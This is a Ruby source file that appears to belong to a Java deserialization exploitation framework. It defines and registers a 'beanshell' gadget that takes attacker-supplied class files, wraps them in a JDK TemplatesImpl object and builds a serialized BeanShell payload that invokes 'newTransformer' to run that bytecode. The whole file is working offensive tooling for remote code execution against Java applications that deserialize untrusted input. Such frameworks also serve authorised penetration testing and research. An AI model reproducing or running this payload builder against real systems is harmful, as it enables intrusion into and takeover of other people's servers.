

require_relative '../payloads/beanshell'
require_relative '../payloads/templates'

class Beanshell < Java::Gadgets::Gadget
  def id
    'beanshell'
  end

  def usable(ctx, params: {})
    return false unless ctx.gadget?('beanshell')

    unless params.fetch('classfiles', nil).nil?
      return false unless Java::Serialize::Payloads::Templates.supported(ctx)
    end

    true
  end

  def targets
    %w[bytecode exec]
  end

  def create(ctx, params: {})
    ctx.reg.load('model/beanshell.json')

    if !params.fetch('classfiles', nil).nil?
      tpl = Java::Serialize::Payloads::Templates.make_jdk(params['classfiles'])
      Java::Serialize::Payloads::Beanshell.make_invoke_noarg(tpl, 'newTransformer')
    else
      raise 'Missing parameters'
    end
  end
end

Java::Gadgets.register(
  Beanshell.new
)
